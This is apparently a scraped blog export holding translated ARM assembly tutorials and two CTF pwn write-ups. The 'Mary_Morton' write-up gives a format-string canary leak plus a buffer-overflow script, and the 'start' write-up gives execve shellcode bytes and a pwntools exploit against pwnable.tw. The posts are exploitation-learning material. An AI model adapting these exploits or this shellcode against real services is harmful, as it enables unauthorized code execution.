Arm汇编指令","slug":"ARM汇编/Part-3-Arm汇编指令","date":"2020-11-09T05:00:52.000Z","updated":"2020-11-10T05:13:46.000Z","comments":true,"path":"2020/11/09/ARM汇编/Part-3-Arm汇编指令/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-3-Arm%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/","excerpt":"","text":"ARM&amp;ThumbARM处理器有两个主要的操作状态，ARM模式以及Thumb模式(Jazelle模式先不考虑)。这些模式与特权模式并不冲突。SVC模式既可以在ARM下调用也可以在Thumb下调用。只不过两种状态的主要不同是指令集的不同，ARM模式的指令集宽度是32位而Thumb是16位宽度(但也可以是32位)。知道何时以及如何使用Thumb模式对于ARM漏洞利用的开发尤其重要。当我们写ARM的shellcode时候，我们需要尽可能的少用NULL以及使用16位宽度的Thumb指令以精简代码。 不同版本ARM，其调用约定不完全相同，而且支持的Thumb指令集也是不完全相同。在某些版本山，ARM提出了扩展型Thumb指令集(也叫Thumbv2)，允许执行32位宽的Thumb指令以及之前版本不支持的条件执行。为了在Thumb模式下使用条件执行指令，Thumb提出了”IT”分支指令。然而，这条指令在之后的版本又被更改移除了，说是为了让一些事情变得更加简单方便。我并不清楚各个版本的ARM架构所支持的具体的ARM/Thumb指令集，而且我也的确不想知道。我觉得你也应该不用深究这个问题。因为你只需要知道你设备上的关键ARM版本所支持的Thumb指令集就可以了。以及ARM信息中心可以帮你弄清楚你的ARM版本到底是多少。 就像之前说到的，Thumb也有很多不同的版本。不过不同的名字仅仅是为了区分不同版本的Thumb指令集而已(也就是对于处理器来说，这些指令永远都是Thumb指令)。 Thumb-1(16位宽指令集)：在ARMv6以及更早期的版本上使用。 Thumb-2(16位/32位宽指令集)：在Thumb-1基础上扩展的更多的指令集(在ARMv6T2以及ARMv7即很多32位Android手机所支持的架构上使用) Thumb-EE：包括一些改变以及对于动态生成代码的补充(即那些在设备上执行前或者运行时编译的代码) ARM与Thumb的不同之处对于条件执行指令（不是条件跳转指令）：所有的ARM状态指令都支持条件执行。一些版本的ARM处理器上允许在Thumb模式下通过IT汇编指令进行条件执行。条件执行减少了要被执行的指令数量，以及用来做分支跳转的语句，所以具有更高的代码密度。 ARM模式与Thumb模式的32位指令：Thumb的32位汇编指令都有类似于a.w的扩展后缀。 桶型移位是另一种独特的ARM模式特性。它可以被用来减少指令数量。比如说，为了减少使用乘法所需的两条指令(乘法操作需要先乘2然后再把结果用MOV存储到另一个寄存器中)，就可以使用在MOV中自带移位乘法操作的左移指令(Mov R1, R0, LSL #1)。 在ARM模式与Thumb模式间切换的话，以下两个条件之一必须满足： 我们可以在使用分支跳转指令BX(branch and exchange)或者分支链接跳转指令BLX(branch,link and exchange)时，将目的寄存器的最低位置为1。之后的代码执行就会在Thumb模式下进行。你也许会好奇这样做目标跳转地址不就有对齐问题了么，因为代码都是2字节或者4字节对齐的？但事实上这并不会造成问题，因为处理器会直接忽略最低比特位的标识。更多的细节我们会在第6篇中解释。 我们之前有说过，在CPSR当前程序状态寄存器中，T标志位用来代表当前程序是不是在Thumb模式下运行的。 ARM指令集规律含义这一节的目的是简要的介绍ARM的通用指令集。知道每一句汇编指令是怎么操作使用，相互关联，最终组成程序是很重要的。之前说过，汇编语言是由构建机器码块的指令组成。所以ARM指令通常由助记符外加一到两个跟在后面的操作符组成，如下面的模板所示： 12MNEMONIC&#123;S&#125;&#123;condition&#125; &#123;Rd&#125;, Operand1, Operand2助记符&#123;是否使用CPSR&#125;&#123;是否条件执行以及条件&#125; &#123;目的寄存器&#125;, 操作符1, 操作符2 由于ARM指令的灵活性，不是全部的指令都满足这个模板，不过大部分都满足了。下面来说说模板中的含义: 123456MNEMONIC - 指令的助记符如ADD&#123;S&#125; - 可选的扩展位，如果指令后加了S，则需要依据计算结果更新CPSR寄存器中的条件跳转相关的FLAG&#123;condition&#125; - 如果机器码要被条件执行，那它需要满足的条件标示&#123;Rd&#125; - 存储结果的目的寄存器Operand1 - 第一个操作数，寄存器或者是一个立即数Operand2 - 第二个(可变的)操作数，可以是一个立即数或者寄存器或者有偏移量的寄存器 当助记符，S，目的寄存器以及第一个操作数都被声明的时候，条件执行以及第二操作数需要一些声明。因为条件执行是依赖于CPSR寄存器的值的，更精确的说是寄存器中的一些比特位。第二操作数是一个可变操作数，因为我们可以以各种形式来使用它，立即数，寄存器，或者有偏移量的寄存器。举例来说，第二操作数还有如下操作： 1234567#123 - 立即数Rx - 寄存器比如R1Rx, ASR n - 对寄存器中的值进行算术右移n位后的值Rx, LSL n - 对寄存器中的值进行逻辑左移n位后的值Rx, LSR n - 对寄存器中的值进行逻辑右移n位后的值Rx, ROR n - 对寄存器中的值进行循环右移n位后的值Rx, RRX - 对寄存器中的值进行带扩展的循环右移1位后的值 在知道了这个机器码模板后，然我们试着去理解这些指令：","categories":[{"name":"ARM汇编","slug":"ARM汇编","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/ARM%E6%B1%87%E7%BC%96/"}],"tags":[{"name":"ARM","slug":"ARM","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/ARM/"}]},{"title":"Part 2: 数据类型寄存器","slug":"ARM汇编/Part-2-数据类型寄存器","date":"2020-11-09T05:00:28.000Z","updated":"2020-11-10T05:14:40.000Z","comments":true,"path":"2020/11/09/ARM汇编/Part-2-数据类型寄存器/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-2-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%AF%84%E5%AD%98%E5%99%A8/","excerpt":"","text":"ARM汇编数据类型基础与高级语言类似，ARM也支持操作不同的数据类型。 被加载或者存储的数据类型可以是无符号（有符号）的字(words，四字节)，半字(halfwords，两字节)，或者字节(bytes)。这些数据类型在汇编语言中的扩展后缀为-h或者-sh对应着半字，-b或者-sb对应着字节，但是对于字并没有对应的扩展。无符号类型与有符号类型的差别是： 符号数据类型可以包含正负数所以数值范围上更低些 无符号数据类型可以放得下很大的正数但是放不了负数 这有一些要求使用对应数据类型做存取操作的汇编指令示例： 12345678910ldr = 加载字，宽度四字节ldrh = 加载无符号的半字，宽度两字节ldrsh = 加载有符号的半字，宽度两字节ldrb = 加载无符号的字节ldrsb = 加载有符号的字节str = 存储字，宽度四字节strh = 存储无符号的半字，宽度两字节strsh = 存储有符号的半字，宽度两字节strb = 存储无符号的字节strsb = 存储有符号的字节 字节序在内存中有两种字节排布顺序，大端序(BE)或者小端序(LE)。两者的主要不同是对象中的每个字节在内存中的存储顺序存在差异。一般X86中是小端序，最低的字节存储在最低的地址上。在大端机中最高的字节存储在最低的地址上。 在版本3之前，ARM使用的是小端序，但在这之后就都是使用大端序了，但也允许切换回小端序。在我们样例代码所在的ARMv6中，指令代码是以[小端序排列对齐]。但是数据访问时采取大端序还是小端序使用程序状态寄存器(CPSR)的第9比特位来决定的。 ARM寄存器寄存器的数量由ARM版本决定。根据[ARM参考手册]，在ARMv6-M与ARMv7-M的处理器中有30个32bit位宽度的通用寄存器。前16个寄存器是用户层可访问控制的，其他的寄存器在高权限进程中可以访问（但ARMv6-M与ARMv7-M除外）。我们仅介绍可以在任何权限模式下访问的16个寄存器。这16个寄存器分为两组：通用寄存器与有特殊含义的寄存器。 下面这张表是ARM架构与寄存器与Intel架构寄存器的关系： R0-R12：用来在通用操作中存储临时的值，指针等。R0被用来存储函数调用的返回值。R7经常被用作存储系统调用号，R11存放着帮助我们找到栈帧边界的指针（之后会讲）。以及，在ARM的函数调用约定中，前四个参数按顺序存放在R0-R3中。 R13：SP(栈指针）。栈指针寄存器用来指向当前的栈顶。栈是一片来存储函数调用中相关数据的内存，在函数返回时会被修改为对应的栈指针。栈指针用来帮助在栈上申请数据空间。比如说你要申请一个字的大小，就会将栈指针减4，再将数据放入之前所指向的位置。 R14：LR(链接寄存器)。当一个函数调用发生，链接寄存器就被用来记录函数调用发生所在位置的下一条指令的地址。这么做允许我们快速的从子函数返回到父函数。 R15：PC(程序计数器)。程序计数器是一个在程序指令执行时自增的计数器。它的大小在ARM模式下总是4字节对齐，在Thumb模式下总是两字节对齐。当执行一个分支指令时，PC存储目的地址。在程序执行中，ARM模式下的PC存储着当前指令加8(两条ARM指令后)的位置，Thumb(v1)模式下的PC存储着当前指令加4(两条Thumb指令后)的位置。这也是X86与ARM在PC上的主要不同之处。 我们可以通过调试来观察PC的行为。我们的程序中将PC的值存到R0中同时包含了两条其他指令，来看看会发生什么。 1234567.section .text.global _start_start: mov r0, pc mov r1, #2 add r2, r1, r1 bkpt 在GDB中，我们开始调试这段汇编代码： 123gef&gt; br _startBreakpoint 1 at 0x8054gef&gt; run 在开始执行触发断点后，首先会在GDB中看到: 1234567891011121314$r0 0x00000000 $r1 0x00000000 $r2 0x00000000 $r3 0x00000000 $r4 0x00000000 $r5 0x00000000 $r6 0x00000000 $r7 0x00000000 $r8 0x00000000 $r9 0x00000000 $r10 0x00000000 $r11 0x00000000 $r12 0x00000000 $sp 0xbefff7e0 $lr 0x00000000 $pc 0x00008054 $cpsr 0x00000010 0x8054 &lt;_start&gt; mov r0, pc &lt;- $pc0x8058 &lt;_start+4&gt; mov r0, #20x805c &lt;_start+8&gt; add r1, r0, r00x8060 &lt;_start+12&gt; bkpt 0x00000x8064 andeq r1, r0, r1, asr #100x8068 cmnvs r5, r0, lsl #20x806c tsteq r0, r2, ror #180x8070 andeq r0, r0, r110x8074 tsteq r8, r6, lsl #6 可以看到在程序的开始PC指向0x8054这个位置即第一条要被执行的指令，那么此时我们使用GDB命令si，执行下一条机器码。下一条指令是把PC的值放到R0寄存器中，所以应该是0x8054么？来看看调试器的结果。 1234567891011121314$r0 0x0000805c $r1 0x00000000 $r2 0x00000000 $r3 0x00000000 $r4 0x00000000 $r5 0x00000000 $r6 0x00000000 $r7 0x00000000 $r8 0x00000000 $r9 0x00000000 $r10 0x00000000 $r11 0x00000000 $r12 0x00000000 $sp 0xbefff7e0 $lr 0x00000000 $pc 0x00008058 $cpsr 0x000000100x8058 &lt;_start+4&gt; mov r0, #2 &lt;- $pc0x805c &lt;_start+8&gt; add r1, r0, r00x8060 &lt;_start+12&gt; bkpt 0x00000x8064 andeq r1, r0, r1, asr #100x8068 cmnvs r5, r0, lsl #20x806c tsteq r0, r2, ror #180x8070 andeq r0, r0, r110x8074 tsteq r8, r6, lsl #60x8078 adfcssp f0, f0, #4.0 当然不是，在执行0x8054这条位置的机器码时，PC已经读到了两条指令后的位置也就是0x805c(见R0寄存器)。所以我们以为直接读取PC寄存器的值时，它指向的是下一条指令的位置。但是调试器告诉我们，PC指向当前指令向后两条机器码的位置。这是因为早期的ARM处理器总是会先获取当前位置后两条的机器码。这么做的原因也是确保与早期处理器的兼容性。 当前程序状态寄存器（CPSR）当你用GDB调试ARM程序的的时候你能会可以看见Flags这一栏（GDB配置插件GEF后就可以看见了，或者直接在GDB里面输入flags也可以）。 图中寄存器“$CSPR“显示了当前状态寄存器的值，Flags里面出现的thumb，fast，interrupt，overflow，carry，zero，negative就是来源于CSPR寄存器中对应比特位的值。ARM架构的N，Z，C，V与X86架构EFLAG中的SF，ZF，CF，OF相对应。这些比特位在汇编级别的条件执行或者循环的跳出时，被用作判断的依据。 上图展示了32位的CPSR寄存器的比特位含义，左边是最大比特位，右边是最小比特位。每个单元代表一个比特。这一个个比特的含义都很丰富： 假设我们用CMP指令去比较1和2，结果会是一个负数因为1-2=-1。然而当我们反过来用2和1比较，C位将被设定，因为在一个较大的数上减了较小的数，没有发生借位。当我们比较两个相同的数比如2和2时，由于结果是0，Z标志位将被置一。注意CMP指令中被使用的寄存器的值并不会被修改，其计算结果仅仅影响到CPSR寄存器中的状态位。 在开了GEF插件的GDB中，计算结果如下图：在这里我们比较的两个寄存器是R1和R0，所以执行后的flag状态如下图。 Carry位Flag被设置的原因是CMP R1,R0会去拿4和2做比较。因为我们用以个较大的数字去减一个较少的数字，没有发生借位。Carry位便被置1。相反的，如果是CMP R0,R1那么Negative位会被置一。","categories":[{"name":"ARM汇编","slug":"ARM汇编","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/ARM%E6%B1%87%E7%BC%96/"}],"tags":[{"name":"ARM","slug":"ARM","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/ARM/"}]},{"title":"Part 1: ARM汇编介绍","slug":"ARM汇编/Part-1-ARM汇编介绍","date":"2020-11-09T05:00:05.000Z","updated":"2020-11-09T08:44:18.000Z","comments":true,"path":"2020/11/09/ARM汇编/Part-1-ARM汇编介绍/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-1-ARM%E6%B1%87%E7%BC%96%E4%BB%8B%E7%BB%8D/","excerpt":"","text":"欢迎来到ARM汇编基础教程，这套教程是为了让你可以在ARM架构下进行漏洞利用打基础的。在我们能开始写ARM的shellcode以及构建ROP链之前，我们需要先学习相关的ARM汇编基础知识。 这些基础知识包括： Part 1：ARM汇编介绍 Part 2：数据类型寄存器 Part 3: ARM指令集 Part 4: 内存相关指令：加载以及存储 Part 5：重复性加载及存储 Part 6: 分支和条件执行 Part 7：栈以及函数 为了能跟着这个系列教程动手实践，你可以准备一个ARM的运行环境。如果你没有ARM设备（比如说树莓派或者手机），你可以通过QEMU来创建一个，[教程在这]。如果你对于GDB调试的基础命令不熟悉的话，可以通过[这个]学习。在这篇教程中，我们的核心关注点为32位的ARM，相关的例子在ARMv6下编译。 为什么是ARM？前面说过，本系列教程的核心目的，是为那些想学习在ARM架构下进行漏洞利用的人而准备。可以看看你身边，有多少设备是ARM架构的， 手机，路由器，以及IOT设备，很多都是ARM架构的。无疑ARM架构已经成为了全世界主流而广泛的CPU架构。所以我们面对的越来越多的安全问题，也都会是ARM架构下的，那么在这种架构下的开发以及漏洞利用，也会成为一种主流趋势。 我们在X86架构上进行了很多研究，而ARM可能是最简单的广泛使用的汇编语言。但是人们为什么不关注ARM呢？可能是在intel架构上可供漏洞利用的学习资料比ARM多得多吧。比如[Corelan Team]写的很棒的intel X86漏洞利用教程，旨在帮助我们可以更准确更高效的学习到关键的漏洞利用基础知识。如果你对于x86漏洞利用很感兴趣，那我觉得Corelan Team的教程是一个不错的选择。但是在我们这个系列里，我们要创造一本高效的ARM架构下的漏洞利用新手手册。 ARM VS. INTELARM处理器Intel处理器有很多不同，但是最主要的不同怕是指令集了。Intel属于复杂指令集（CISC）处理器，有很多特性丰富的访问内存的复杂指令集。因此它拥有更多指令代码以及取址都是，但是寄存器比ARM的要少。复杂指令集处理器主要被应用在PC机，工作站以及服务器上。 ARM属于简单指令集（RISC）处理器，所以与复杂指令集先比，只有简单的差不多100条指令集，但会有更多的寄存器。与Intel不同，ARM的指令集仅仅操作寄存器或者是用于从内存的加载/储存过程，这也就是说，简单的加载/存储指令即可访问到内存。这意味着在ARM中，要对特定地址中存储的的32位值加一的话，仅仅需要从内存中加载到寄存器，加一，再从寄存器储存到内存即可。 简单的指令集既有好处也有坏处。一个好处就是代码的执行变得更快了。（RISC指令集允许通过缩短时钟周期来加速代码执行）。坏处就是更少的指令集也要求了编写代码时要更加注意指令间使用的关系以及约束。还有重要的一点，ARM架构有两种模式，ARM模式和Thumb模式。Thumb模式的代码只有2或者4字节。 ARM与X86的不同还体现在： ARM中很多指令都可以用来做为条件执行的判断依据 X86与X64机器码使用小端格式 ARM机器码在版本3之前是小端。但是之后默认采用大端格式，但可以设置切换到小端。 除了以上这些ARM与Intel间的差异，ARM自身也有很多版本。本系列教程旨在尽力保持通用性的情况下来讲讲ARM的工作流程。而且当你懂得了这个形式，学习其他版本的也很容易了。在系列教程中使用的样例都是在32位的ARMv6下运行的，所以相关解释也是主要依赖这个版本的。 不同版本的ARM命名也是有些复杂： 写ARM汇编在开始用ARM汇编做漏洞利用开发之前，还是需要先学习下基础的汇编语言知识的。为什么我们需要ARM汇编呢，用正常的变成语言写不够么？的确不够，因为如果我们想做逆向工程，或者理解相关二进制程序的执行流程，构建我们自己的ARM架构的shellcode，ROP链，以及调试ARM应用，这些都要求先懂得ARM汇编。当然你也不需要学习的太过深入，足够做逆向工作以及漏洞利用开发刚刚好。如果有些知识要求先了解一些背景知识，别担心，这些知识也会在本系列文章里面介绍到的。当然如果你想学习更多，也可以去本文末尾提供的相关链接学习。 ARM汇编，是一种更容易被人们接受的汇编语言。当然我们的计算机也不能直接运行汇编代码，还是需要编译成机器码的。通过编译工具链中as程序来将文件后缀为”.s”的汇编代码编译成机器码。写完汇编代码后，一般保存后缀为”.s”的文件，然后你需要用as编译以及用ld链接程序: 12$ as program.s -o program.o$ ld program.o -o program 汇编语言本质让我们来看看汇编语言的底层本质。在最底层，只有电路的电信号。信号被格式化成可以变化的高低电平0V(off)或者5V(on)。但是通过电压变化来表述电路状态是繁琐的，所以用0和1来代替高低电平，也就有了二进制格式。由二进制序列组成的组合便是最小的计算机处理器工作单元了，比如下面的这句机器码序列就是例子。 11110 0001 1010 0000 0010 0000 0000 0001 看上去不错，但是我们还是不能记住这些组合的含义。所以，我们需要用助记符和缩写来帮助我们记住这些二进制组合。这些助记符一般是连续的三个字母，我们可以用这些助记符作为指令来编写程序。这种程序就叫做汇编语言程序。用以代表一种计算机的机器码的助记符集合就叫做这种计算机汇编语言。因此，汇编语言是人们用来编写程序的最底层语言。同时指令的操作符也有对应的助记符，比如： 1MOV R2, R1 现在我们知道了汇编程序是助记符的文本信息集合，我们需要将其转换成机器码。就像之前的，在[GNU Binutils]工程中提供了叫做as的工具。使用汇编工具去将汇编语言转换成机器码的过程叫做汇编(assembling)。(参考：gcc生成可执行文件的过程) 总结一下，在这篇中我们学习了计算机是通过由0101代表高低电平的机器码序列来进行运算的。我们可以使用机器码去让计算机做我们想让它做的事情。不过因为我们不能记住机器码，我们使用了缩写助记符来代表有相关功能的机器码，这些助记符的集合就是汇编语言。最后我们使用汇编器将汇编语言转换成机器可以理解的机器码。当然，在更高级别的语言编译生成机器码过程中，核心原理也是这个。 拓展阅读 Whirlwind Tour of ARM Assembly. ARM assembler in Raspberry Pi. Practical Reverse Engineering: x86, x64, ARM, Windows Kernel, Reversing Tools, and Obfuscation by Bruce Dang, Alexandre Gazet, Elias Bachaalany and Sebastien Josse. ARM Reference Manual. Assembler User Guide. 译文仅供参考，具体内容表达以及含义以原文为准","categories":[{"name":"ARM汇编","slug":"ARM汇编","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/ARM%E6%B1%87%E7%BC%96/"}],"tags":[{"name":"ARM","slug":"ARM","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/ARM/"}]},{"title":"Mary_Morton","slug":"PWN/AD_World/Mary-Morton","date":"2020-11-06T15:10:59.000Z","updated":"2020-11-07T02:30:32.000Z","comments":true,"path":"2020/11/06/PWN/AD_World/Mary-Morton/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/","excerpt":"","text":"检查文件保护措施 开启了Canary机制，并且设置了不可执行栈。 查找可疑的字符串 其函数的地址为：0x4008DA 函数执行逻辑12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; int v3; // [rsp+24h] [rbp-Ch] unsigned __int64 v4; // [rsp+28h] [rbp-8h] v4 = __readfsqword(0x28u); sub_4009FF(); puts(&quot;Welcome to the battle ! &quot;); puts(&quot;[Great Fairy] level pwned &quot;); puts(&quot;Select your weapon &quot;); while ( 1 ) &#123; while ( 1 ) &#123; sub_4009DA(); __isoc99_scanf(&quot;%d&quot;, &amp;v3); if ( v3 != 2 ) break; sub_4008EB(); &#125; if ( v3 == 3 ) &#123; puts(&quot;Bye &quot;); exit(0); &#125; if ( v3 == 1 ) sub_400960(); else puts(&quot;Wrong!&quot;); &#125;&#125;int sub_4009DA()&#123; puts(&quot;1. Stack Bufferoverflow Bug &quot;); puts(&quot;2. Format String Bug &quot;); return puts(&quot;3. Exit the battle &quot;);&#125;// 格式化字符串漏洞unsigned __int64 sub_4008EB()&#123; char buf; // [rsp+0h] [rbp-90h] unsigned __int64 v2; // [rsp+88h] [rbp-8h] v2 = __readfsqword(0x28u); memset(&amp;buf, 0, 0x80uLL); read(0, &amp;buf, 0x7FuLL); printf(&amp;buf, &amp;buf); return __readfsqword(0x28u) ^ v2;&#125;// 缓冲区溢出漏洞unsigned __int64 sub_400960()&#123; char buf; // [rsp+0h] [rbp-90h] unsigned __int64 v2; // [rsp+88h] [rbp-8h] v2 = __readfsqword(0x28u); memset(&amp;buf, 0, 0x80uLL); read(0, &amp;buf, 0x100uLL); printf(&quot;-&gt; %s\\n&quot;, &amp;buf); return __readfsqword(0x28u) ^ v2;&#125; 输入v3=1，跳转到缓冲区溢出漏洞，如果不存在canary保护机制，则可以直接覆盖返回地址跳转到system函数。 输入v3=2，跳转到格式化字符串漏洞，可以打印出栈上Canary，之后利用缓冲区溢出覆盖即可。 输入v3=3，退出程序 绕过Canary机制 看一下流程图和汇编可以知道readsqword这个地方有canary保护，只有 rax 和fs：28h 两个值相等的时候 才能跳转到返回值，反之则调用stack_chk_fail。 根据程序可以看出，v2应该就是canary的值，一开始，将_readfsqword(0x28u)的值给v2，后来又和v2做异或操作，只有v2与它还相等，程序返回0，否则返回不为零的数。 泄露v2（Canary）的值 程序中格式化字符串漏洞为 12read(0, &amp;buf, 0x7FuLL); printf(&amp;buf, &amp;buf); 程序将输入的AAAA存入buf中，之后格式化字符串打印出了其对应的ASCII码，因此可以计算出格式化字符串中&amp;buf的偏移量，即&amp;buf在第6个参数的位置。 根据IDA的注释，我们知道buf在rbp-90h，v2在rbp-8h，canary与我们输入参数的偏移为0x90 - 0x8 = 0x88，然后八个字节为一组，0x88 / 8 = 17，因此Canary即v2在格式化字符串的第17 + 6 = 23参数的位置。 基本的格式化字符串参数 %c：输出字符，配上%n可用于向指定地址写数据。 %d：输出十进制整数，配上%n可用于向指定地址写数据。 %x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。 %p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。 %s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。 %n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%​$hn或%$hhn来适时调整。 %n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。 注意%p、%x会直接打印栈上存储的值，而%s会打印栈上存储值所指向地址的值。 编写python脚本payload的构造：覆盖返回地址，需要0x90-0x8=0x88覆盖局部变量，然后放上canary的值，在填充8个“a”覆盖ebp（64位程序），最后加上system的返回地址。 12345678910111213141516171819202122from pwn import*p = remote(&#x27;220.249.52.133&#x27;,49747) p.recvuntil(&#x27;3. Exit the battle&#x27;)p.sendline(&#x27;2&#x27;) p.sendline(&#x27;%23$p&#x27;) p.recvuntil(&#x27;0x&#x27;)canary = int(p.recv(16),16)print(canary) flag_addr = 0x4008dapayload = b&#x27;a&#x27;*0x88 + p64(canary) + b&#x27;deafbeef&#x27; + p64(flag_addr) p.recvuntil(&#x27;3. Exit the battle&#x27;)p.sendline(&#x27;1&#x27;)p.sendline(payload) p.interactive() PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"AD_World","slug":"PWN/AD-World","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/AD-World/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"},{"name":"Stack","slug":"Stack","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Stack/"}]},{"title":"start","slug":"PWN/Pwnable_tw/start","date":"2020-11-04T08:41:33.000Z","updated":"2020-11-11T14:03:28.000Z","comments":true,"path":"2020/11/04/PWN/Pwnable_tw/start/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/11/04/PWN/Pwnable_tw/start/","excerpt":"","text":"检查文件保护措施 RELRO(Relocation Read Only)：尽量使存储区域只读 IDA32查看文件123456789101112char start()&#123; char result; // al result = 3; __asm &#123; int 80h; LINUX - sys_write int 80h; LINUX - &#125; return result;&#125; 其对应的汇编代码： 12345678910111213141516171819202122232425262728293031323334保存现场环境esp、_exit.text:08048060 push esp.text:08048061 push offset _exit清空寄存器EAX EBX ECX EDX.text:08048066 xor eax, eax.text:08048068 xor ebx, ebx.text:0804806A xor ecx, ecx.text:0804806C xor edx, edx向栈上压入参数.text:0804806E push 3A465443h CTF:.text:08048073 push 20656874h the.text:08048078 push 20747261h art.text:0804807D push 74732073h s st.text:08048082 push 2774654Ch Let’系统调用80h.text:08048087 mov ecx, esp ; addr.text:08048089 mov dl, 14h ; len.text:0804808B mov bl, 1 ; fd.text:0804808D mov al, 4.text:0804808F int 80h ; LINUX - sys_write系统调用80h.text:08048091 xor ebx, ebx.text:08048093 mov dl, 3Ch.text:08048095 mov al, 3.text:08048097 int 80h ; LINUX -恢复栈平衡，返回到_exit.text:08048099 add esp, 14h.text:0804809C retn.text:0804809C _start endp ; sp-analysis failed 函数结构很简单，采用int 80调用了两个系统调用，下面先补充int 80系统调用的细节： 1． 执行用户程序(如:fork)2． 根据glibc中的函数实现，取得系统调用号并执行int $0x80产生中断。3． 进行地址空间的转换和堆栈的切换，执行SAVE_ALL。（进行内核模式）4． 进行中断处理，根据系统调用表调用内核函数。5． 执行内核函数。6． 执行RESTORE_ALL并返回用户模式Linux 32位的系统调用时通过int 80h来实现的，eax寄存器中为调用的功能号，ebx、ecx、edx、esi等等寄存器则依次为参数。 系统调用功能号 这里使用的两个系统调用信息如下： 第一个系统调用：将esp开始的14h字节数据写入标准输出（文件描述符1），即输出”Let’s start the CTF:” name eax ebx ecx edx sys_write 0x04 unsigned int fd = 1 const char __user *buf = esp size_t count =14h 第二个系统调用从标准输入读取3ch字节到栈空间。 name eax ebx ecx edx sys_read 0x03 unsigned int fd = 1 char __user *buf = esp size_t count = 3ch 思路分析1 .程序执行到0804808Fsys_write，输出14h字节数据：Let’s start the CTF: 123456789101112131415 +-----------------+ &lt;---- | Let’ | | +-----------------+ | | s st | | +-----------------+ | | art | 14h +-----------------+ | | the | | +-----------------+ | | CTF: | | +-----------------+ &lt;----- | offset _exit | +-----------------+ | Saved ESP |H-&gt; +-----------------+ 2.程序执行到08048097sys_read，read函数最多可以读取3ch字节，超出了分配的空间，可以用来覆盖ret_addr和esp。经调试验证，20字节后覆盖ret，24字节后覆盖esp。 123456789101112131415 +-----------------+ &lt;---- | aaaa | | +-----------------+ | | aaaa | | +-----------------+ | | aaaa | 14h +-----------------+ | | aaaa | | +-----------------+ | | aaaa | | +-----------------+ &lt;----- | aaaa | +-----------------+ | Saved ESP |H-&gt; +-----------------+ 3.泄露ESP现在EIP已经在我们的掌控之中了，关键是如何跳转到布置的shell code中。一般来说，首先会去找JMP ESP指令，这样就能让shellcode获得执行。但这段汇编代码没有，可以利用的只有read和write。如果可以write出Saved ESP的地址，然后覆盖掉offset _exit，就能成功shell。 4. 覆盖RET此时程序已经泄露出之前的Saved_esp，栈的情况已经摸清了，然后程序继续执行read，注意read完 add esp, 14h后再ret，因此，ret_addr在esp+14h的地方。 5. shellcode(原理)shellcode同样可以用系统调用的方式执行execve(“/bin/sh”,NULL,NULL) name eax ebx ecx edx esi sys_execve 0x0b char __user * char user *user * char user *user * struct pt_regs 其中，该程序是 32 位，所以我们需要使得 系统调用号，即 eax 应该为 0xb 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。 第二个参数，即 ecx 应该为 0 第三个参数，即 edx 应该为 0 12345678910shellcode=&#x27;&#x27;&#x27;xor eax,eaxpush eaxpush %spush %smov ebx, espxor ecx,ecxxor edx,edxmov al, 0xbint 0x80&#x27;&#x27;&#x27; %(u32(&#x27;/sh\\0&#x27;),u32(&#x27;/bin&#x27;)) 使用asm(shellcode)来进行汇编,可以使用context来指定cpu类型以及操作系统。 如：context(arch = ‘amd64’ , os = ‘linux’, log_level=”debug”) 编写python脚本12345678910111213141516171819202122from pwn import *#context.log_level = &quot;debug&quot;rem = remote(&#x27;chall.pwnable.tw&#x27;, 10000)#等待write执行完毕rem.recvuntil(&#x27;:&#x27;)#发送溢出数据，覆盖ret为0x08048087-&gt;输出14h字节line = b&#x27;A&#x27; * 20 + p32(0x8048087)rem.send(line)#接收输出数据，其中就有Saved ESPstack_addr = rem.recv()[0:4]#直接使用网上的shellcodeshellcode = b&#x27;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&#x27;#参考覆盖RET分析shellcode_addr = p32(int.from_bytes(stack_addr, &#x27;little&#x27;) + 20)payload = b&#x27;A&#x27; * 0x14 + shellcode_addr + shellcoderem.sendline(payload)rem.interactive() 